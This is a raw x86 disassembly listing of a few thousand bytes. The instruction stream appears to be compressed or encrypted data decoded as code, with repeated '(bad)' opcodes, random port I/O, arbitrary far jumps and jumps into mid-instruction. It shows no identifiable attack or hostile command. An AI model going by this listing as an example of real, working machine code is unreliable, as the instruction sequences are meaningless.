  42c211:	arpl   WORD PTR [eax],bp
  42c213:	sbb    esi,esp
  42c215:	mov    cl,0x25
  42c217:	in     eax,0x80
  42c219:	icebp  
  42c21a:	xor    BYTE PTR [esi+0x803a122],bl
  42c220:	mov    ah,0xd6
  42c222:	mov    ch,0x5
  42c224:	mov    ebp,fs
  42c226:	adc    dl,cl
  42c228:	pop    esp
  42c229:	pop    eax
  42c22a:	(bad)  
  42c22b:	xor    edx,DWORD PTR [esi+0x6d]
  42c22e:	xchg   BYTE PTR [esi+0x3a],ah
  42c231:	mov    ch,0x7b
  42c233:	nop
  42c234:	xor    al,0x48
  42c236:	lock or DWORD PTR [edi+edx*1],ebp
  42c23a:	int    0xee
  42c23c:	and    BYTE PTR [eax],dh
  42c23e:	mov    ebp,edi
  42c240:	fcom   QWORD PTR [esi+ecx*8]
  42c243:	daa    
  42c244:	mov    esp,?
  42c246:	fbstp  TBYTE PTR [ecx-0x56d21b55]
  42c24c:	shl    DWORD PTR [edx+0x27],1
  42c24f:	cmp    ebx,DWORD PTR [edx-0x4a]
  42c252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c253:	iret   
  42c254:	hlt    
  42c255:	test   BYTE PTR [edi+0x66],ah
  42c258:	mov    eax,0x20a42080
  42c25d:	xor    ah,0x95
  42c260:	mov    WORD PTR [ecx-0x7a],ss
  42c263:	and    eax,0xf588c0ba
  42c268:	outs   dx,DWORD PTR ds:[esi]
  42c269:	jg     0x42c2a6
  42c26b:	imul   ebx,DWORD PTR [edx],0x22322d5
  42c271:	jl     0x42c273
  42c273:	xor    eax,0x277a92ec
  42c278:	fisttp QWORD PTR [edx+0x4ccde67e]
  42c27e:	fwait
  42c27f:	push   edx
  42c280:	adc    ebp,ebp
  42c282:	je     0x42c301
  42c284:	push   edx
  42c285:	sbb    dh,BYTE PTR [esi+0x58]
  42c288:	ficomp DWORD PTR ds:0x6dfe3a5b
  42c28e:	iret   
  42c28f:	mov    bl,0x43
  42c291:	in     eax,dx
  42c292:	mov    ebp,0xe909b806
  42c297:	jmp    0x23b:0x2439e5dd
  42c29e:	mov    dh,0x15
  42c2a0:	aas    
  42c2a1:	mov    ds:0xc7b68e7b,al
  42c2a6:	or     cl,BYTE PTR [ebx+0x7dbd1946]
  42c2ac:	(bad)  
  42c2ae:	outs   dx,BYTE PTR ds:[esi]
  42c2af:	jmp    0x2621:0xa2d35951
  42c2b6:	repz addr16 daa 
  42c2b9:	cmp    edi,ebp
  42c2bb:	xchg   DWORD PTR [ebx-0x6eb5fe83],esp
  42c2c1:	shl    bh,1
  42c2c3:	inc    eax
  42c2c4:	xchg   ebp,eax
  42c2c5:	lock arpl WORD PTR [ebx-0x6],bp
  42c2c9:	adc    BYTE PTR [edi+ecx*1],0xee
  42c2cd:	nop
  42c2ce:	xor    eax,0x9259c12d
  42c2d3:	or     al,0x64
  42c2d5:	mov    dl,0xcf
  42c2d7:	jb     0x42c2ae
  42c2d9:	gs dec esi
  42c2db:	xchg   esp,eax
  42c2dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2dd:	push   edx
  42c2de:	add    eax,0xaecfe05c
  42c2e3:	dec    esi
  42c2e4:	vhsubpd ymm4,ymm2,YMMWORD PTR [ebp-0x42621f3a]
  42c2ec:	out    dx,al
  42c2ed:	out    dx,al
  42c2ee:	in     al,0x63
  42c2f0:	mov    edx,0xfa822705
  42c2f5:	dec    edi
  42c2f6:	cwde   
  42c2f7:	fwait
  42c2f8:	in     eax,dx
  42c2f9:	add    ecx,0x2e
  42c2fc:	sub    al,0x9c
  42c2fe:	and    eax,0xe9d11d7e
  42c303:	jmp    0x42c300
  42c305:	pop    ss
  42c306:	jo     0x42c385
  42c308:	adc    al,0x3c
  42c30a:	ffreep st(2)
  42c30c:	imul   edx,DWORD PTR [esi+0x656c06],0x0
	...
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x28a87cf6
  42c383:	xor    eax,0x1d9eb
  42c388:	add    eax,0xe000001
  42c38d:	and    eax,0x5989e200
  42c392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c393:	pop    esi
  42c394:	xchg   ecx,eax
  42c395:	pop    ebx
  42c396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c397:	xchg   ebx,edi
  42c399:	push   cs
  42c39a:	jmp    0x42c3ba
  42c39c:	fst    QWORD PTR [edx-0x4c831ad6]
  42c3a2:	cli    
  42c3a3:	fsubr  DWORD PTR [esi+0x72ad1bb]
  42c3a9:	pop    ds
  42c3aa:	and    BYTE PTR [edx+edx*4],bl
  42c3ad:	aad    0xd3
  42c3af:	mov    dh,0x82
  42c3b1:	mov    DWORD PTR [eax-0x59ea5ef4],eax
  42c3b7:	les    ebp,FWORD PTR [edi+0x62]
  42c3ba:	xor    DWORD PTR [edx-0x56],esp
  42c3bd:	mov    ds:0x741fbff8,eax
  42c3c2:	jae    0x42c3e2
  42c3c4:	or     ah,BYTE PTR [edx]
  42c3c6:	inc    ecx
  42c3c7:	inc    esp
  42c3c8:	pop    eax
  42c3c9:	fsubrp st(7),st
  42c3cb:	(bad)  
  42c3cc:	hlt    
  42c3cd:	xor    eax,0x4e3ca2bd
  42c3d2:	push   cs
  42c3d3:	aam    0x74
  42c3d5:	shl    BYTE PTR [ecx],1
  42c3d7:	xchg   edx,eax
  42c3d8:	sub    esi,edx
  42c3da:	push   ds
  42c3db:	xchg   al,bl
  42c3dd:	shl    DWORD PTR [ebx+0x1e],cl
  42c3e0:	in     eax,dx
  42c3e1:	xchg   ecx,eax
  42c3e2:	mov    esi,0x317a5891
  42c3e7:	cmp    al,0x33
  42c3e9:	inc    edi
  42c3ea:	mov    gs,esi
  42c3ec:	cmp    dh,0x49
  42c3ef:	xor    eax,0x32793200
  42c3f4:	in     eax,0xb1
  42c3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3f7:	mov    dh,BYTE PTR [ebp+ebx*8+0x2854f57d]
  42c3fe:	jg     0x42c3ea
  42c400:	pop    ds
  42c401:	xor    ecx,DWORD PTR [eax]
  42c403:	pop    ecx
  42c404:	dec    edx
  42c405:	mov    ebx,0x72cddda1
  42c40a:	push   esi
  42c40b:	adc    DWORD PTR [edx],esi
  42c40d:	sbb    dl,BYTE PTR [edi+0x23]
  42c410:	xchg   edi,eax
  42c411:	cwde   
  42c412:	(bad)  
  42c413:	bound  esi,QWORD PTR [edx-0xd]
  42c416:	imul   esp,DWORD PTR [ebx-0x9],0x354afc1b
  42c41d:	aad    0xff
  42c41f:	out    dx,al
  42c420:	adc    DWORD PTR ss:[ebp+0xc6a49ed],edx
  42c427:	mov    al,ds:0x13bf3586
  42c42c:	das    
  42c42d:	pop    ebp
  42c42e:	ror    ch,1
  42c430:	or     esi,edx
  42c432:	jle    0x42c3f8
  42c434:	lods   al,BYTE PTR ds:[esi]
  42c435:	aaa    
  42c436:	mov    ebp,0xb5a8f422
  42c43b:	ror    dl,0xf
  42c43e:	sar    esp,cl
  42c440:	sti    
  42c441:	aas    
  42c442:	cmp    ecx,DWORD PTR [ebp-0xe]
  42c445:	call   0x749e2c9e
  42c44a:	pop    esi
  42c44b:	test   DWORD PTR [edx-0x5c],eax
  42c44e:	mov    ds:0x4c552ed3,eax
  42c453:	mov    ebx,0xe21abb9f
  42c458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c459:	into   
  42c45a:	cli    
  42c45b:	cmp    eax,0x2d68c2af
  42c460:	in     al,0x12
  42c462:	pop    edx
  42c463:	sbb    edx,DWORD PTR [ebx-0x24]
  42c466:	adc    ecx,DWORD PTR [eax+0x6d3d30f6]
  42c46c:	fistp  DWORD PTR [esi+ebp*2]
  42c46f:	sub    esp,DWORD PTR [ebx]
  42c471:	push   0x7d
  42c473:	push   0x79
  42c475:	sub    ch,0x1e
  42c478:	push   ecx
  42c479:	mov    DWORD PTR [ebp-0x54b21823],eax
  42c47f:	dec    eax
  42c480:	pop    ss
  42c481:	test   eax,0x7002a8be
  42c486:	sar    BYTE PTR [ecx+0x1d],0x60
  42c48a:	les    eax,FWORD PTR [ecx-0x4fca2fff]
  42c490:	fiadd  DWORD PTR [eax]
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x7634,0x3b
  42c502:	mov    ecx,DWORD PTR [eax+esi*8]
  42c505:	fiadd  DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x71000001,al
  42c50d:	push   0xb
  42c50f:	and    al,0x37
  42c511:	fdivr  DWORD PTR [ebx-0x1b9e7c62]
  42c517:	pop    esp
  42c518:	imul   edi,DWORD PTR [ecx-0x1d],0xffffffdd
  42c51c:	(bad)  
  42c51d:	in     eax,0x41
  42c51f:	xor    ah,dl
  42c521:	pusha  
  42c522:	ins    DWORD PTR es:[edi],dx
  42c523:	(bad)  
  42c524:	jne    0x42c583
  42c526:	call   0x9a13d0e1
  42c52b:	stos   DWORD PTR es:[edi],eax
  42c52c:	or     BYTE PTR [esi],0x55
  42c52f:	xor    bl,al
  42c531:	clc    
  42c532:	push   edx
  42c533:	add    edx,ecx
  42c535:	cdq    
  42c536:	fwait
  42c537:	cmp    eax,0x244d8893
  42c53c:	add    BYTE PTR [edi],bl
  42c53e:	(bad)  
  42c540:	(bad)  
  42c541:	sub    esi,DWORD PTR fs:[esp+eiz*8]
  42c545:	sub    bh,al
  42c547:	(bad)  
  42c548:	mov    esi,DWORD PTR [ebx+0x2272b730]
  42c54e:	arpl   WORD PTR [esi+0x2ff730f1],dx
  42c554:	dec    ecx
  42c555:	add    esi,0x3c
  42c558:	or     bl,BYTE PTR fs:[eax*4+0x7513159f]
  42c560:	sahf   
  42c561:	jb     0x42c59b
  42c563:	rcl    BYTE PTR [ecx+0x5c],cl
  42c566:	mov    eax,0x597bf303
  42c56b:	cdq    
  42c56c:	cmp    al,0x6c
  42c56e:	sub    al,0xc8
  42c570:	cmp    al,0x2f
  42c572:	aam    0x76
  42c574:	les    eax,FWORD PTR [ecx+0xf]
  42c577:	xchg   esi,eax
  42c578:	xor    ebp,DWORD PTR [edx-0x36d6a105]
  42c57e:	ins    BYTE PTR es:[edi],dx
  42c57f:	mov    bh,0x65
  42c581:	push   esi
  42c582:	ror    BYTE PTR [ecx-0x5c],cl
  42c585:	dec    ecx
  42c586:	pop    ebp
  42c587:	retf   0x3471
  42c58a:	je     0x42c5c9
  42c58c:	sti    
  42c58d:	sbb    ecx,edx
  42c58f:	imul   eax,ebp,0x39
  42c592:	cmp    BYTE PTR es:[ecx+ecx*1-0x12f33edd],cl
  42c59a:	test   ah,al
  42c59c:	cmp    BYTE PTR [edi],ch
  42c59e:	jns    0x42c59a
  42c5a0:	sub    BYTE PTR [ebp+0x45],cl
  42c5a3:	cmp    bl,BYTE PTR [ecx+0x19874724]
  42c5a9:	ds inc edx
  42c5ab:	or     ah,BYTE PTR [edi+ebp*4]
  42c5ae:	cmc    
  42c5af:	add    al,0x64
  42c5b1:	pop    eax
  42c5b2:	dec    edx
  42c5b3:	stc    
  42c5b4:	mov    ah,0x3b
  42c5b6:	mov    ch,0xdd
  42c5b8:	or     esi,edx
  42c5ba:	sub    bh,al
  42c5bc:	mov    edx,0x7f5ca709
  42c5c1:	fdivr  QWORD PTR [esi]
  42c5c3:	jge    0x42c62f
  42c5c5:	mov    ecx,0x5eff939c
  42c5ca:	call   0x6a9b80b
  42c5cf:	scas   al,BYTE PTR es:[edi]
  42c5d0:	xor    eax,0xc8896f1e
  42c5d5:	cmp    ah,BYTE PTR [edi-0x7]
  42c5d8:	ins    DWORD PTR es:[edi],dx
  42c5d9:	pop    esp
  42c5da:	enter  0xb7fb,0x4f
  42c5de:	or     BYTE PTR [esi-0x7e26a2f2],0x83
  42c5e5:	shl    dh,0x7c
  42c5e8:	int3   
  42c5e9:	mov    edx,0xc3c52b6f
  42c5ee:	out    0xb8,al
  42c5f0:	cmp    eax,0x9818c071
  42c5f5:	inc    ebx
  42c5f6:	imul   esp,esp,0x22
  42c5f9:	jb     0x42c59c
  42c5fb:	xlat   BYTE PTR ds:[ebx]
  42c5fc:	inc    esi
  42c5fd:	sub    BYTE PTR [ecx-0x34],bh
  42c600:	dec    esi
  42c601:	cmp    eax,0xa098b498
  42c606:	mov    eax,ds:0xcb7550e
  42c60b:	test   al,0x1b
  42c60d:	pop    es
  42c60e:	jmp    0x0:0xc597
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x6f920395]
  42c681:	jb     0x42c667
  42c683:	aas    
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xba000001,al
  42c68d:	push   0x955ba86f
  42c692:	xchg   ebp,eax
  42c693:	push   esp
  42c694:	out    0x9c,eax
  42c696:	mov    DWORD PTR [ebx+0x11],ebx
  42c699:	push   cs
  42c69a:	adc    al,0x19
  42c69c:	push   eax
  42c69d:	sub    BYTE PTR [edi-0x690e537d],0x8
  42c6a4:	xchg   ebp,eax
  42c6a5:	aam    0xd1
  42c6a7:	in     al,dx
  42c6a8:	dec    eax
  42c6a9:	mov    cl,0x0
  42c6ab:	add    cl,BYTE PTR [ebx]
  42c6ad:	xor    DWORD PTR [ecx-0x4],ecx
  42c6b0:	into   
  42c6b1:	xchg   ebx,eax
  42c6b2:	pop    ebx
  42c6b3:	and    esi,DWORD PTR [edi-0x612c760e]
  42c6b9:	imul   edx,ecx,0x313e7920
  42c6bf:	bnd jp 0x42c649
  42c6c2:	mov    edx,eax
  42c6c4:	shr    DWORD PTR [ebx-0x16cb024],1
  42c6ca:	cwde   
  42c6cb:	cmp    al,0x72
  42c6cd:	out    0x56,al
  42c6cf:	icebp  
  42c6d0:	out    0xec,eax
  42c6d2:	pop    eax
  42c6d3:	sti    
  42c6d4:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42c6d6:	pop    es
  42c6d7:	pop    esp
  42c6d8:	xlat   BYTE PTR ds:[ebx]
  42c6d9:	(bad)  
  42c6da:	jae    0x42c737
  42c6dc:	outs   dx,DWORD PTR ds:[esi]
  42c6dd:	inc    edi
  42c6de:	and    eax,0x8bdcc29c
  42c6e3:	xor    bh,bl
  42c6e5:	inc    edx
  42c6e6:	dec    ecx
  42c6e7:	fsub   DWORD PTR [ecx-0x63]
  42c6ea:	push   esi
  42c6eb:	jp     0x42c6d5
  42c6ed:	call   0x92c33ead
  42c6f2:	(bad)  
  42c6f3:	and    eax,0x886b6936
  42c6f8:	mov    al,0x1
  42c6fa:	inc    esi
  42c6fb:	pop    esi
  42c6fc:	cmp    eax,0x88af94ec
  42c701:	sar    esp,1
  42c703:	push   es
  42c704:	cwde   
  42c705:	icebp  
  42c706:	out    dx,al
  42c707:	rcl    BYTE PTR [edx],0x20
  42c70a:	mov    ds:0x6c9454df,eax
  42c70f:	dec    eax
  42c710:	sbb    ch,BYTE PTR [esi+esi*4]
  42c713:	xor    DWORD PTR [ecx+ebp*8+0x7e4ed7bc],esp
  42c71a:	mov    cl,bh
  42c71c:	xor    al,bl
  42c71e:	mov    eax,ds:0x28175b82
  42c723:	cmc    
  42c724:	mov    dl,BYTE PTR [eax+0x4]
  42c727:	xchg   ebx,eax
  42c728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c729:	xor    BYTE PTR [esi+0x33],ah
  42c72c:	sub    DWORD PTR [edx],edi
  42c72e:	mov    bl,0x42
  42c730:	xchg   esp,eax
  42c731:	(bad)  
  42c733:	sub    bl,ch
  42c735:	sub    dh,0xca
  42c738:	cmp    eax,0x458a5b31
  42c73d:	push   es
  42c73e:	add    BYTE PTR [edi+0x50a32397],al
  42c744:	and    dh,BYTE PTR ds:0x29b89b7f
  42c74a:	mov    eax,ds:0x3d5e499a
  42c74f:	mov    DWORD PTR [ebp+0x6e],0x783c867
  42c756:	shl    DWORD PTR [edx-0x11],0x73
  42c75a:	lods   al,BYTE PTR ds:[esi]
  42c75b:	enter  0xf159,0xd8
  42c75f:	jnp    0x42c73e
  42c761:	and    bh,BYTE PTR [ebx+ecx*2]
  42c764:	scas   al,BYTE PTR es:[edi]
  42c765:	nop    DWORD PTR [eax]
  42c768:	into   
  42c769:	sub    ebp,ebx
  42c76b:	lea    esp,[eax-0x428b14c8]
  42c771:	xchg   DWORD PTR [ecx-0x40],esi
  42c774:	mov    edi,0x25353441
  42c779:	jae    0x42c790
  42c77b:	lods   eax,DWORD PTR ds:[esi]
  42c77c:	cs sti 
  42c77e:	xor    bl,BYTE PTR [ebp-0x5c4828c5]
  42c784:	int    0xd
  42c786:	sbb    ch,BYTE PTR [ebp+0x12911feb]
  42c78c:	xor    DWORD PTR [ecx],esp
  42c78e:	and    DWORD PTR [edi+0x14],0x0
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x4951a40e
  42c802:	das    
  42c803:	in     al,0xfa
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x19000001,al
  42c80d:	cli    
  42c80e:	inc    eax
  42c80f:	sbb    al,al
  42c811:	cmp    ch,BYTE PTR [edx]
  42c813:	add    dh,BYTE PTR [ebp+eiz*1-0x66]
  42c817:	sti    
  42c818:	sbb    DWORD PTR [edx+0x4dcc4d42],0x478be5f
  42c822:	pop    ebx
  42c823:	js     0x42c7bc
  42c825:	xchg   ebx,eax
  42c826:	push   ecx
  42c827:	not    BYTE PTR ds:0xe9a49323
  42c82d:	fwait
  42c82e:	js     0x42c84c
  42c830:	jo     0x42c7c6
  42c832:	sub    bx,bp
  42c835:	dec    eax
  42c836:	data16 (bad) 
  42c839:	or     bl,BYTE PTR [ebx-0x4d970d0f]
  42c83f:	mov    esp,0xcf549f93
  42c844:	push   0xffffff92
  42c846:	aad    0x42
  42c848:	inc    ecx
  42c849:	pop    esp
  42c84a:	sub    esi,0x6b831e99
  42c850:	hlt    
  42c851:	cmp    dh,BYTE PTR [edi]
  42c853:	leave  
  42c854:	mov    edi,esp
  42c856:	int3   
  42c857:	sti    
  42c858:	mov    eax,ds:0xcbc70f59
  42c85d:	(bad)  
  42c85e:	in     eax,0x71
  42c860:	jo     0x42c7e2
  42c862:	mov    ah,BYTE PTR [eax+0x44]
  42c865:	pop    edi
  42c866:	test   al,0x71
  42c868:	inc    ebx
  42c869:	xor    DWORD PTR [ebp+0x7b81b93],esp
  42c86f:	es out 0x99,eax
  42c872:	out    0x76,eax
  42c874:	test   bl,al
  42c876:	mov    ch,0xbb
  42c878:	jbe    0x42c8ea
  42c87a:	mov    eax,0xefba2858
  42c87f:	jg     0x42c845
  42c881:	mov    esp,0x77c4ad2b
  42c886:	jae    0x42c833
  42c888:	es xor eax,0xe8506086
  42c88e:	repnz xor al,0x90
  42c891:	bound  edi,QWORD PTR [ecx]
  42c893:	mov    DWORD PTR [ebp*2+0x41afd7c5],ebx
  42c89a:	jae    0x42c898
  42c89c:	dec    edx
  42c89d:	and    esi,DWORD PTR [esi]
  42c89f:	jle    0x42c918
  42c8a1:	push   ss
  42c8a2:	int3   
  42c8a3:	xchg   ebp,eax
  42c8a4:	xchg   edx,eax
  42c8a5:	out    0x42,eax
  42c8a7:	js     0x42c8d7
  42c8a9:	push   0xffffff85
  42c8ab:	xor    DWORD PTR [ebp-0x163f3563],ecx
  42c8b1:	sbb    al,0x25
  42c8b3:	in     eax,0xb8
  42c8b5:	hlt    
  42c8b6:	xchg   ecx,eax
  42c8b7:	sbb    BYTE PTR [eax-0x50f4657a],dh
  42c8bd:	push   ebx
  42c8be:	(bad)  
  42c8bf:	inc    edx
  42c8c0:	and    ch,dl
  42c8c2:	cmp    BYTE PTR [eax+0x4f5d3c9a],al
  42c8c8:	aaa    
  42c8c9:	push   ebp
  42c8ca:	cmp    eax,DWORD PTR [edx+0x622dc77d]
  42c8d0:	test   ch,al
  42c8d2:	fadd   DWORD PTR [edx-0x6ac1aa22]
  42c8d8:	clc    
  42c8d9:	pop    DWORD PTR [esi]
  42c8db:	fst    QWORD PTR [ebx+0x21]
  42c8de:	imul   edi,ebx,0xffffffed
  42c8e1:	jge    0x42c909
  42c8e3:	aad    0x99
  42c8e5:	add    al,0xcc
  42c8e7:	pop    ss
  42c8e8:	jnp    0x42c8aa
  42c8ea:	aaa    
  42c8eb:	arpl   WORD PTR [esi+0x72],di
  42c8ee:	arpl   WORD PTR [ebx-0x76],si
  42c8f1:	mov    BYTE PTR [edi+edx*4-0x50],bh
  42c8f5:	out    0xc4,al
  42c8f7:	jg     0x42c8c8
  42c8f9:	or     ebx,DWORD PTR [eax+0x58]
  42c8fc:	cli    
  42c8fd:	add    ebp,esi
  42c8ff:	imul   edx,DWORD PTR [esi-0x51ae0039],0x2815a3c5
  42c909:	cwde   
  42c90a:	pop    esp
  42c90b:	and    bl,0xaf
  42c90e:	retf   0x1afc
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x1b48c91e
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x6000001,al
  42c98d:	and    eax,0x869b7ef0
  42c992:	loopne 0x42c95e
  42c994:	inc    esi
  42c995:	fiadd  WORD PTR [eax-0x1e]
  42c998:	in     eax,0x5b
  42c99a:	push   ds
  42c99b:	mov    ebp,0x17d38a47
  42c9a0:	jge    0x42c9a3
  42c9a2:	sbb    eax,0xb276ef3e
  42c9a7:	and    eax,0x5107eeb2
  42c9ac:	cmp    BYTE PTR [ecx],dh
  42c9ae:	jmp    0x42c9a5
  42c9b0:	(bad)  
  42c9b2:	cli    
  42c9b3:	mov    ebp,0x6ee9841a
  42c9b8:	dec    esp
  42c9b9:	out    dx,al
  42c9ba:	pusha  
  42c9bb:	mov    ch,0xa2
  42c9bd:	or     eax,0x7d1d9645
  42c9c2:	dec    esp
  42c9c3:	jnp    0x42c9ca
  42c9c5:	sub    BYTE PTR [edx+0x4a],0xf6
  42c9c9:	xor    eax,0xb49265d7
  42c9ce:	in     al,dx
  42c9cf:	xlat   BYTE PTR ds:[ebx]
  42c9d0:	pusha  
  42c9d1:	or     eax,0xf718951c
  42c9d6:	inc    ebx
  42c9d7:	ja     0x42c96e
  42c9d9:	or     al,0xaf
  42c9db:	mov    al,0x7a
  42c9dd:	sub    dh,BYTE PTR [eax]
  42c9df:	hlt    
  42c9e0:	out    dx,eax
  42c9e1:	mov    dh,0xff
  42c9e3:	push   ebx
  42c9e4:	jp     0x42c98d
  42c9e6:	pushf  
  42c9e7:	push   eax
  42c9e8:	mov    esi,0xf0d8b26e
  42c9ed:	sbb    eax,esp
  42c9ef:	pop    ecx
  42c9f0:	out    dx,al
  42c9f1:	cmp    BYTE PTR [ebp+eax*2-0x672a2cbd],dl
  42c9f8:	push   ebp
  42c9f9:	jbe    0x42c9f7
  42c9fb:	jne    0x42c9d6
  42c9fd:	fstp   DWORD PTR [edx-0x7c4e2856]
  42ca03:	addr16 jne 0x42c9aa
  42ca06:	into   
  42ca07:	add    cl,BYTE PTR [ebx-0x4c]
  42ca0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca0b:	mov    dl,cl
  42ca0d:	pop    edx
  42ca0e:	inc    ebx
  42ca0f:	test   eax,0x32524d0
  42ca14:	std    
  42ca15:	xor    DWORD PTR [ebp-0xbf731be],esp
  42ca1b:	pop    eax
  42ca1c:	stos   BYTE PTR es:[edi],al
  42ca1d:	mov    dh,al
  42ca1f:	mov    ch,0x60
  42ca21:	push   edi
  42ca22:	idiv   BYTE PTR [edx+0x2d]
  42ca25:	std    
  42ca26:	jbe    0x42ca73
  42ca28:	sahf   
  42ca29:	mov    ebp,0x8986d2d
  42ca2e:	sbb    dh,BYTE PTR [edi+0x31d09a26]
  42ca34:	jmp    0x42ca8f
  42ca36:	shl    BYTE PTR [ecx-0x75],1
  42ca39:	into   
  42ca3a:	sbb    BYTE PTR [edi+esi*2-0x7725c2aa],bl
  42ca41:	fcomp  st(7)
  42ca43:	sbb    BYTE PTR [ebx-0x5b080e68],al
  42ca49:	aam    0xd0
  42ca4b:	jb     0x42ca3f
  42ca4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca4e:	jp     0x42ca44
  42ca50:	loop   0x42cac9
  42ca52:	setl   ch
  42ca55:	fs xchg ebp,eax
  42ca57:	xchg   edx,eax
  42ca58:	aam    0x34
  42ca5a:	xor    ebp,DWORD PTR [esi-0x36]
  42ca5d:	int3   
  42ca5e:	jge    0x42ca8b
  42ca60:	mov    ch,0x34
  42ca62:	jg     0x42cacd
  42ca64:	(bad)  
  42ca65:	sub    eax,0x15d8abb4
  42ca6a:	push   es
  42ca6b:	(bad)  
  42ca6c:	int    0xc9
  42ca6e:	adc    edx,ebp
  42ca70:	fcomi  st,st(5)
  42ca72:	sar    DWORD PTR [eax-0x8],1
  42ca75:	test   al,0xbf
  42ca77:	(bad)  
  42ca78:	aad    0x23
  42ca7a:	not    BYTE PTR [esi+0x3137b750]
  42ca80:	push   0x74
  42ca82:	jns    0x42ca7f
  42ca84:	es sbb edx,esp
  42ca87:	adc    cl,bh
  42ca89:	and    eax,0x58b0069f
  42ca8e:	xor    al,BYTE PTR [esi+0x9d]
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x39726ec0]
  42cb02:	repz xor BYTE PTR [edi+ebx*8],al
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0xb8000001
  42cb0d:	pop    ss
  42cb0e:	or     eax,0x3345b7f9
  42cb13:	mov    ah,0x18
  42cb15:	(bad)  
  42cb16:	and    al,0xa9
  42cb18:	sbb    eax,0x28b8051b
  42cb1d:	test   DWORD PTR es:[ebx-0x53cfccb8],eax
  42cb24:	sti    
  42cb25:	std    
  42cb26:	mov    ebp,0xe8f5ce78
  42cb2b:	(bad)  
  42cb2c:	push   ds
  42cb2d:	push   ebp
  42cb2e:	ds mov bl,0x63
  42cb31:	les    edx,FWORD PTR [eax]
  42cb33:	xor    eax,0x521e6421
  42cb38:	push   eax
  42cb39:	leave  
  42cb3a:	push   ebx
  42cb3b:	xchg   esi,eax
  42cb3c:	jl     0x42cb87
  42cb3e:	cmc    
  42cb3f:	jb     0x42cb6b
  42cb41:	cmp    ax,WORD PTR [eax+0x71]
  42cb45:	test   BYTE PTR [eax],al
  42cb47:	cs pop esi
  42cb49:	ja     0x42cb4c
  42cb4b:	inc    ecx
  42cb4c:	lock mov ebp,0xb6eee28b
  42cb52:	sti    
  42cb53:	pop    eax
  42cb54:	clc    
  42cb55:	pop    ebx
  42cb56:	(bad)  
  42cb57:	lock out 0x4a,eax
  42cb5a:	pusha  
  42cb5b:	dec    edx
  42cb5c:	inc    esp
  42cb5d:	fucom  st(7)
  42cb5f:	mov    edx,DWORD PTR [eax-0x2c0ad73e]
  42cb65:	gs mov bl,0x6
  42cb68:	adc    eax,0x69a1d88c
  42cb6d:	inc    edi
  42cb6e:	mov    ah,0x56
  42cb70:	or     BYTE PTR [esi],0x54
  42cb73:	push   es
  42cb74:	pop    ss
  42cb75:	jl     0x42cbab
  42cb77:	push   es
  42cb78:	xchg   esi,eax
  42cb79:	cld    
  42cb7a:	xor    eax,0x66011082
  42cb7f:	xchg   ebx,eax
  42cb80:	(bad)  
  42cb81:	push   edi
  42cb82:	(bad)  
  42cb83:	ds repnz adc eax,0xf223e866
  42cb8a:	jg     0x42cb5b
  42cb8c:	lea    ebp,ds:0xfb43693e
  42cb92:	push   esi
  42cb93:	cmp    al,0x6d
  42cb95:	push   esp
  42cb96:	ret    0x7cfe
  42cb99:	and    al,0x3b
  42cb9b:	pop    esp
  42cb9c:	lds    ebx,FWORD PTR [esi-0xe131b09]
  42cba2:	dec    eax
  42cba3:	out    0xae,eax
  42cba5:	sti    
  42cba6:	jge    0x42cc17
  42cba8:	push   ebp
  42cba9:	mov    dh,0x8e
  42cbab:	push   0x7e13985c
  42cbb0:	jecxz  0x42cc24
  42cbb2:	jmp    0x277fab18
  42cbb7:	cmp    ebp,ebx
  42cbb9:	xchg   edi,eax
  42cbba:	cmp    DWORD PTR [ecx+ecx*4],0x2e8ac2fb
  42cbc1:	enter  0xb276,0x8e
  42cbc5:	mov    cl,0xc5
  42cbc7:	test   BYTE PTR [edx-0x57],cl
  42cbca:	add    BYTE PTR [edi],dh
  42cbcc:	mov    edi,0x175b8fd5
  42cbd1:	std    
  42cbd2:	pusha  
  42cbd3:	icebp  
  42cbd4:	sub    bl,ch
  42cbd6:	popf   
  42cbd7:	mov    ecx,0xe061fc92
  42cbdc:	xor    ch,ah
  42cbde:	xchg   esi,eax
